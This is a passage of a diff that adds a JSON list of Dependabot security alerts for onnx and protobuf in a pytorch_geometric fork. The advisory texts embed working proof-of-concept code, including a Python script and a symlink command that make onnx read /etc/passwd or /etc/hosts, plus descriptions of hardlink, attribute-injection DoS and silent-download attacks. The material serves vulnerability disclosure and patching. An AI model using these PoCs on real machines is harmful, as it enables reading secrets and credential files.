+                    "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+                },
+                {
+                    "cwe_id": "CWE-59",
+                    "name": "Improper Link Resolution Before File Access ('Link Following')"
+                },
+                {
+                    "cwe_id": "CWE-367",
+                    "name": "Time-of-check Time-of-use (TOCTOU) Race Condition"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "<= 1.20.1",
+            "first_patched_version": {
+                "identifier": "1.21.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/9",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/9",
+        "created_at": "2026-08-14T19:15:18Z",
+        "updated_at": "2026-08-16T01:23:55Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:55Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 8,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-p433-9wv8-28xj",
+            "cve_id": "CVE-2026-34447",
+            "summary": "ONNX: External Data Symlink Traversal",
+            "description": "Summary\n- Issue: Symlink traversal in external data loading allows reading files outside the model directory.\n- Affected code: `onnx/onnx/checker.cc: resolve_external_data_location` used via Python `onnx.external_data_helper.load_external_data_for_model`.\n- Impact: Arbitrary file read (confidentiality breach) when a model’s external data path resolves to a symlink targeting a file outside the model directory.\n\nRoot Cause\n- The function `resolve_external_data_location(base_dir, location, tensor_name)` intends to ensure that external data files reside within `base_dir`. It:\n  - Rejects empty/absolute paths\n  - Normalizes the relative path and rejects `..`\n  - Builds `data_path = base_dir / relative_path`\n  - Checks `exists(data_path)` and `is_regular_file(data_path)`\n- However, `std::filesystem::is_regular_file(path)` follows symlinks to their targets. A symlink placed inside `base_dir` that points to a file outside `base_dir` will pass the checks and be returned. The Python loader then opens the path and reads the target file.\n\nCode Reference\n- File: onnx/onnx/checker.cc:970-1060\n- Key logic:\n  - Normalization: `auto relative_path = file_path.lexically_normal().make_preferred();`\n  - Existence: `std::filesystem::exists(data_path)`\n  - Regular file check: `std::filesystem::is_regular_file(data_path)`\n  - Returned path is later opened in Python: `external_data_helper.load_external_data_for_tensor`.\n\nProof of Concept (PoC)\n- File: `onnx_external_data_symlink_traversal_poc.py`\n- Behavior: Creates a model with an external tensor pointing to `tensor.bin`. In the model directory, creates `tensor.bin` as a symlink to `/etc/hosts` (or similar). Calls `load_external_data_for_model(model, base_dir)`. Confirms that `tensor.raw_data` contains content from the target outside the model directory.\n- Run:\n  - `python3 onnx_external_data_symlink_traversal_poc.py`\n  - Expected: `[!!!] VULNERABILITY CONFIRMED: external_data symlink escaped base_dir`\n\nonnx_external_data_symlink_traversal_poc.py\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nONNX External Data Symlink Traversal PoC\n\nFinding: load_external_data_for_model() (via c_checker._resolve_external_data_location)\ndoes not reject symlinks. A relative location that is a symlink inside the\nmodel directory can target a file outside the directory and will be read.\n\nImpact: Arbitrary file read outside model_dir when external data files are\nobtained from attacker-controlled archives (zip/tar) that create symlinks.\n\nThis PoC:\n - Creates a model with a tensor using external_data location 'tensor.bin'\n - Creates 'tensor.bin' as a symlink to a system file (e.g., /etc/hosts)\n - Calls load_external_data_for_model(model, base_dir)\n - Confirms that tensor.raw_data contains the content of the outside file\n\nSafe: only reads a benign system file if present.\n\"\"\"\n\nimport os\nimport sys\nimport tempfile\nimport pathlib\n\n# Ensure we import installed onnx, not the local cloned package\n_here = os.path.dirname(os.path.abspath(__file__))\nif _here in sys.path:\n    sys.path.remove(_here)\n\nimport onnx\nfrom onnx import helper, TensorProto\nfrom onnx.external_data_helper import (\n    set_external_data,\n    load_external_data_for_model,\n)\n\n\ndef pick_target_file():\n    candidates = [\"/etc/hosts\", \"/etc/passwd\", \"/System/Library/CoreServices/SystemVersion.plist\"]\n    for p in candidates:\n        if os.path.exists(p) and os.path.isfile(p):\n            return p\n    raise RuntimeError(\"No suitable readable system file found for this PoC\")\n\n\ndef build_model_with_external(location: str):\n    # A 1D tensor; data will be filled from external file\n    tensor = helper.make_tensor(\n        name=\"X_ext\",\n        data_type=TensorProto.UINT8,\n        dims=[0],  # dims will be inferred after raw_data is read\n        vals=[],\n    )\n    # add dummy raw_data then set_external_data to mark as external\n    tensor.raw_data = b\"dummy\"\n    set_external_data(tensor, location=location)\n\n    # Minimal graph that just feeds the initializer as Constant\n    const_node = helper.make_node(\"Constant\", inputs=[], outputs=[\"out\"], value=tensor)\n    graph = helper.make_graph([const_node], \"g\", inputs=[], outputs=[helper.make_tensor_value_info(\"out\", TensorProto.UINT8, None)])\n    model = helper.make_model(graph)\n    return model\n\n\ndef main():\n    base = tempfile.mkdtemp(prefix=\"onnx_symlink_poc_\")\n    model_dir = base\n    link_name = os.path.join(model_dir, \"tensor.bin\")\n\n    target = pick_target_file()\n    print(f\"[*] Using target file: {target}\")\n\n    # Create symlink in model_dir pointing outside\n    try:\n        pathlib.Path(link_name).symlink_to(target)\n    except OSError as e:\n        print(f\"[!] Failed to create symlink: {e}\")\n        print(\"    This PoC needs symlink capability.\")\n        return 1\n\n    # Build model referencing the relative location 'tensor.bin'\n    model = build_model_with_external(location=\"tensor.bin\")\n\n    # Use in-memory model; explicitly load external data from base_dir\n    loaded = model\n    print(\"[*] Loading external data into in-memory model...\")\n    try:\n        load_external_data_for_model(loaded, base_dir=model_dir)\n    except Exception as e:\n        print(f\"[!] load_external_data_for_model raised: {e}\")\n        return 1\n\n    # Validate that raw_data came from outside file by checking a prefix\n    raw = None\n    # Search initializers\n    for t in loaded.graph.initializer:\n        if t.name == \"X_ext\" and t.HasField(\"raw_data\"):\n            raw = t.raw_data\n            break\n    # Search constant attributes if not found\n    if raw is None:\n        for node in loaded.graph.node:\n            for attr in node.attribute:\n                if attr.HasField(\"t\") and attr.t.name == \"X_ext\" and attr.t.HasField(\"raw_data\"):\n                    raw = attr.t.raw_data\n                    break\n            if raw is not None:\n                break\n    if raw is None:\n        print(\"[?] Did not find raw_data on tensor; PoC inconclusive\")\n        return 2\n\n    with open(target, \"rb\") as f:\n        target_prefix = f.read(32)\n    if raw.startswith(target_prefix):\n        print(\"[!!!] VULNERABILITY CONFIRMED: external_data symlink escaped base_dir\")\n        print(f\"      Symlink {link_name} -> {target}\")\n        return 0\n    else:\n        print(\"[?] Raw data did not match target prefix; environment-specific behavior\")\n        return 3\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n\n```",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-p433-9wv8-28xj",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-34447",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/onnx/onnx/security/advisories/GHSA-p433-9wv8-28xj"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34447"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/onnx/PYSEC-2026-104.yaml"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-p433-9wv8-28xj"
+                }
+            ],
+            "published_at": "2026-04-01T21:14:00Z",
+            "updated_at": "2026-06-08T18:37:35Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "onnx"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "< 1.21.0",
+                    "first_patched_version": {
+                        "identifier": "1.21.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                    "score": 5.5
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00248,
+                "percentile": 0.15851
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                "score": 5.5
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-22",
+                    "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+                },
+                {
+                    "cwe_id": "CWE-61",
+                    "name": "UNIX Symbolic Link (Symlink) Following"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 1.21.0",
+            "first_patched_version": {
+                "identifier": "1.21.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/8",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/8",
+        "created_at": "2026-08-14T19:15:18Z",
+        "updated_at": "2026-08-16T01:23:55Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:55Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 7,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-cmw6-hcpp-c6jp",
+            "cve_id": "CVE-2026-34446",
+            "summary": "ONNX: Arbitrary File Read via ExternalData Hardlink Bypass in ONNX load",
+            "description": "### Summary\nThe issue is in `onnx.load` — the code checks for symlinks to prevent path traversal, but completely misses hardlinks, which is the problem, since a hardlink looks exactly like a regular file on the filesystem.\n\n### The Real Problem\nThe validator in `onnx/checker.cc` only calls `is_symlink()` and never checks the inode or `st_nlink`, so a hardlink walks right through every security check without any issues.\n\n### Impact\nEspecially dangerous in AI supply chain scenarios like HuggingFace — a single malicious model is enough to silently steal secrets from the victim's machine without them noticing anything.",
+            "severity": "medium",
+            "identifiers": [
+                {
+                    "value": "GHSA-cmw6-hcpp-c6jp",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-34446",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/onnx/onnx/security/advisories/GHSA-cmw6-hcpp-c6jp"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34446"
+                },
+                {
+                    "url": "https://github.com/onnx/onnx/commit/4755f8053928dce18a61db8fec71b69c74f786cb"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-cmw6-hcpp-c6jp"
+                }
+            ],
+            "published_at": "2026-04-01T21:13:37Z",
+            "updated_at": "2026-04-01T21:13:39Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "onnx"
+                    },
+                    "severity": "medium",
+                    "vulnerable_version_range": "<= 1.20.1",
+                    "first_patched_version": {
+                        "identifier": "1.21.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                    "score": 4.7
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00176,
+                "percentile": 0.07276
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                "score": 4.7
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-22",
+                    "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+                },
+                {
+                    "cwe_id": "CWE-61",
+                    "name": "UNIX Symbolic Link (Symlink) Following"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "<= 1.20.1",
+            "first_patched_version": {
+                "identifier": "1.21.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/7",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/7",
+        "created_at": "2026-08-14T19:15:18Z",
+        "updated_at": "2026-08-16T01:23:55Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:55Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 6,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-538c-55jv-c5g9",
+            "cve_id": "CVE-2026-34445",
+            "summary": "ONNX: Malicious ONNX models can crash servers by exploiting unprotected object settings.",
+            "description": "### Summary\nThe ExternalDataInfo class in ONNX was using Python’s setattr() function to load metadata (like file paths or data lengths) directly from an ONNX model file. The problem? It didn’t check if the \"keys\" in the file were valid. Because it blindly trusted the file, an attacker could craft a malicious model that overwrites internal object properties.\n\n### Why its Dangerous\n**Instant Crash DoS**: An attacker can set the length property to a massive number like 9 petabytes. When the system tries to load the model, it attempts to allocate all that RAM at once, causing the server to crash or freeze Out of Memory.\n\n**Access Bypass**: By setting a negative offset -1, an attacker can trick the system into reading parts of a file it wasn't supposed to touch.\n\n**Object Corruption**: Attackers can even inject \"dunder\" attributes like __class__ to change the object's type entirely, which could lead to more complex exploits.\n\n**Fixed**: https://github.com/onnx/onnx/pull/7751 object state corruption and DoS via ExternalDataInfo attribute injection",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-538c-55jv-c5g9",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-34445",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/onnx/onnx/security/advisories/GHSA-538c-55jv-c5g9"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34445"
+                },
+                {
+                    "url": "https://github.com/onnx/onnx/pull/7751"
+                },
+                {
+                    "url": "https://github.com/onnx/onnx/commit/e30c6935d67cc3eca2fa284e37248e7c0036c46b"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-538c-55jv-c5g9"
+                }
+            ],
+            "published_at": "2026-04-01T21:10:52Z",
+            "updated_at": "2026-04-01T21:10:53Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "onnx"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "<= 1.20.1",
+                    "first_patched_version": {
+                        "identifier": "1.21.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H",
+                    "score": 8.6
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00288,
+                "percentile": 0.2054
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H",
+                "score": 8.6
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-20",
+                    "name": "Improper Input Validation"
+                },
+                {
+                    "cwe_id": "CWE-400",
+                    "name": "Uncontrolled Resource Consumption"
+                },
+                {
+                    "cwe_id": "CWE-915",
+                    "name": "Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "<= 1.20.1",
+            "first_patched_version": {
+                "identifier": "1.21.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/6",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/6",
+        "created_at": "2026-08-14T19:15:17Z",
+        "updated_at": "2026-08-16T01:23:55Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:55Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 5,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-3r9x-f23j-gc73",
+            "cve_id": "CVE-2026-27489",
+            "summary": "onnx Vulnerable to Path Traversal via Symlink",
+            "description": "### Summary\nA path traversal vulnerability via symlink allows to read arbitrary files outside model or user-provided directory. \n\n### Details\nThe following check for symlink is ineffective and it is possible to point a symlink to an arbitrary location on the file system:\nhttps://github.com/onnx/onnx/blob/336652a4b2ab1e530ae02269efa7038082cef250/onnx/checker.cc#L1024-L1033\n\n`std::filesystem::is_regular_file` performs a `status(p)` call on the provided path, which follows symbolic links to determine the file type, meaning it will return true if the target of a symlink is a regular file. \n\n\n### PoC\n\n\n\n```python\n# Create a demo model with external data\nimport os\nimport numpy as np\nimport onnx\nfrom onnx import helper, TensorProto, numpy_helper\n\ndef create_onnx_model(output_path=\"model.onnx\"):\n    weight_matrix = np.random.randn(1000, 1000).astype(np.float32)\n\n    X = helper.make_tensor_value_info(\"X\", TensorProto.FLOAT, [1, 1000])\n    Y = helper.make_tensor_value_info(\"Y\", TensorProto.FLOAT, [1, 1000])\n    W = numpy_helper.from_array(weight_matrix, name=\"W\")\n\n    matmul_node = helper.make_node(\"MatMul\", inputs=[\"X\", \"W\"], outputs=[\"Y\"], name=\"matmul\")\n\n    graph = helper.make_graph(\n        nodes=[matmul_node],\n        name=\"SimpleModel\",\n        inputs=[X],\n        outputs=[Y],\n        initializer=[W]\n    )\n\n    model = helper.make_model(graph, opset_imports=[helper.make_opsetid(\"\", 11)])\n    onnx.checker.check_model(model)\n\n    data_file = output_path.replace('.onnx', '.data')\n\n    if os.path.exists(output_path):\n        os.remove(output_path)\n    if os.path.exists(data_file):\n        os.remove(data_file)\n\n    onnx.save_model(\n        model,\n        output_path,\n        save_as_external_data=True,\n        all_tensors_to_one_file=True,\n        location=os.path.basename(data_file),\n        size_threshold=1024 * 1024\n    )\n\nif __name__ == \"__main__\":\n    create_onnx_model(\"model.onnx\")\n```\n\n1. Run the above code to generate a sample model with external data.\n2. Remove `model.data`\n3. Run `ln -s /etc/passwd model.data`\n4. Load the model using the following code\n5. Observe check for symlink is bypassed and model is succesfuly loaded\n\n```python\nimport onnx\nfrom onnx.external_data_helper import load_external_data_for_model\n\ndef load_onnx_model_basic(model_path=\"model.onnx\"):\n    model = onnx.load(model_path)\n    return model\n\ndef load_onnx_model_explicit(model_path=\"model.onnx\"):\n    model = onnx.load(model_path, load_external_data=False)\n    load_external_data_for_model(model, \".\")\n    return model\n\nif __name__ == \"__main__\":\n    model = load_onnx_model_basic(\"model.onnx\")\n\n```\n\nA common misuse case for successful exploitation is that an adversary can provide victim with a compressed file, containing `poc.onnx` and `poc.data (symlink)`. Once the victim uncompress and load the model, symlink read the adversary selected arbitrary file.\n\n\n### Impact\n\nRead sensitive and arbitrary files and environment variable (e.g. /proc/1/environ) from the host that loads the model.\n\nNOTE: this issue is not limited to UNIX.\n\n### Sample patch\n\n```c\n#include <fcntl.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <errno.h>\n\nint open_external_file_no_symlink(const char *base_dir,\n                                  const char *relative_path) {\n    int dirfd = -1;\n    int fd = -1;\n    struct stat st;\n\n    // Open base directory\n    dirfd = open(base_dir, O_RDONLY | O_DIRECTORY);\n    if (dirfd < 0) {\n        return -1;\n    }\n\n    // Open the target relative to base_dir\n    // O_NOFOLLOW => fail if final path component is a symlink\n    fd = openat(dirfd,\n                relative_path,\n                O_RDONLY | O_NOFOLLOW);\n    close(dirfd);\n\n    if (fd < 0) {\n        // ELOOP is the typical error if a symlink is encountered\n        return -1;\n    }\n\n    // Inspect the *opened file*\n    if (fstat(fd, &st) != 0) {\n        close(fd);\n        return -1;\n    }\n\n    // Enforce \"regular file only\"\n    if (!S_ISREG(st.st_mode)) {\n        close(fd);\n        errno = EINVAL;\n        return -1;\n    }\n\n    // fd is now:\n    // - not a symlink\n    // - not a directory\n    // - not a device / FIFO / socket\n    // - race-safe\n    return fd;\n}\n```\n\n### Resources\n\n* https://cwe.mitre.org/data/definitions/61.html\n* https://discuss.secdim.com/t/input-validation-necessary-but-not-sufficient-it-doesnt-target-the-fundamental-issue/1172\n* https://discuss.secdim.com/t/common-pitfalls-for-patching-path-traversal/3368",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-3r9x-f23j-gc73",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-27489",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/onnx/onnx/security/advisories/GHSA-3r9x-f23j-gc73"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27489"
+                },
+                {
+                    "url": "https://github.com/onnx/onnx/commit/4755f8053928dce18a61db8fec71b69c74f786cb"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-3r9x-f23j-gc73"
+                }
+            ],
+            "published_at": "2026-03-31T22:34:25Z",
+            "updated_at": "2026-04-06T16:43:16Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "onnx"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "<= 1.20.0",
+                    "first_patched_version": {
+                        "identifier": "1.21.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": null,
+                    "score": 0.0
+                },
+                "cvss_v4": {
+                    "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+                    "score": 8.7
+                }
+            },
+            "epss": {
+                "percentage": 0.00593,
+                "percentile": 0.45519
+            },
+            "cvss": {
+                "vector_string": null,
+                "score": 0.0
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-23",
+                    "name": "Relative Path Traversal"
+                },
+                {
+                    "cwe_id": "CWE-61",
+                    "name": "UNIX Symbolic Link (Symlink) Following"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "<= 1.20.0",
+            "first_patched_version": {
+                "identifier": "1.21.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/5",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/5",
+        "created_at": "2026-08-14T19:15:17Z",
+        "updated_at": "2026-08-16T01:23:54Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:54Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 4,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-hqmj-h5c6-369m",
+            "cve_id": "CVE-2026-28500",
+            "summary": "ONNX Untrusted Model Repository Warnings Suppressed by silent=True in onnx.hub.load() — Silent Supply-Chain Attack",
+            "description": "## What's the issue\nPassing `silent=True` to `onnx.hub.load()` kills all trust warnings and user prompts. This means a model can be downloaded from any unverified GitHub repo with zero user awareness.\n \n```python\nif not _verify_repo_ref(repo) and not silent:\n    # completely skipped when silent=True\n    print(\"The model repo... is not trusted\")\n    if input().lower() != \"y\":\n        return None\n```\n \nOn top of that, the SHA256 integrity check is useless here — it validates against a manifest that lives in the same repo the attacker controls, so the hash will always match.\n\n \n## Impact\nAny pipeline using `hub.load()` with `silent=True` and an external repo string is silently loading whatever the repo owner ships. If that model executes arbitrary code on load, the attacker has access to the machine.\n \n## Resolved by removing the feature \n## References\n \n- [Write-up](https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-28500.md)",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-hqmj-h5c6-369m",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-28500",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/onnx/onnx/security/advisories/GHSA-hqmj-h5c6-369m"
+                },
+                {
+                    "url": "https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-28500.md"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-28500"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/onnx/PYSEC-2026-103.yaml"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-hqmj-h5c6-369m"
+                }
+            ],
+            "published_at": "2026-03-16T16:23:28Z",
+            "updated_at": "2026-06-08T18:35:10Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "onnx"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "<= 1.20.1",
+                    "first_patched_version": {
+                        "identifier": "1.21.0rc1"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+                    "score": 8.6
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00318,
+                "percentile": 0.24558
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+                "score": 8.6
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-345",
+                    "name": "Insufficient Verification of Data Authenticity"
+                },
+                {
+                    "cwe_id": "CWE-494",
+                    "name": "Download of Code Without Integrity Check"
+                },
+                {
+                    "cwe_id": "CWE-693",
+                    "name": "Protection Mechanism Failure"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "onnx"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "<= 1.20.1",
+            "first_patched_version": {
+                "identifier": "1.21.0rc1"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/4",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/4",
+        "created_at": "2026-08-14T19:15:17Z",
+        "updated_at": "2026-08-16T01:23:54Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:54Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 3,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "protobuf"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-7gcm-g887-7qv7",
+            "cve_id": "CVE-2026-0994",
+            "summary": "protobuf affected by a JSON recursion depth bypass",
+            "description": "A denial-of-service (DoS) vulnerability exists in google.protobuf.json_format.ParseDict() in Python, where the max_recursion_depth limit can be bypassed when parsing nested google.protobuf.Any messages.\n\nDue to missing recursion depth accounting inside the internal Any-handling logic, an attacker can supply deeply nested Any structures that bypass the intended recursion limit, eventually exhausting Python’s recursion stack and causing a RecursionError.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-7gcm-g887-7qv7",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-0994",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-0994"
+                },
+                {
+                    "url": "https://github.com/protocolbuffers/protobuf/pull/25239"
+                },
+                {
+                    "url": "https://github.com/protocolbuffers/protobuf/issues/25070"
+                },
+                {
+                    "url": "https://github.com/protocolbuffers/protobuf/commit/d2b001626d137c62dfee6c88c87324102531868b"
+                },
+                {
+                    "url": "https://github.com/protocolbuffers/protobuf/commit/5ebddcb1bcbe51d1fe323baa145e85f4f23128cf"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-7gcm-g887-7qv7"
+                }
+            ],
+            "published_at": "2026-01-23T15:31:35Z",
+            "updated_at": "2026-02-05T15:47:46Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "protobuf"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": ">= 6.30.0rc1, <= 6.33.4",
+                    "first_patched_version": {
+                        "identifier": "6.33.5"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "protobuf"
